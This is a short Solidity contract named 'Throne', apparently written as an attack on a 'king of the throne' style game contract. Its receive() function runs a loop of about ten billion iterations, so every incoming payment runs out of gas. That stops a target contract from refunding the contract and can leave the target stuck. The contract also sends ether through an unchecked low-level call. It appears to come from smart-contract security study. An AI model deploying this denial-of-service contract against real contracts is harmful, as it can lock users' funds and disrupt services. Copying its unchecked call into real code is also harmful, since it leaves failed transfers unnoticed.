pragma solidity ^0.8.0;

contract Throne{
	
	function sendEther (address payable _addr) public{
	
		_addr.call{value: 0.001 ether}("");

	}

	receive() external payable {
		uint i;
		uint iter;
		for(i = 0; i<9999999999; i++){
			iter++;
		}
	}
}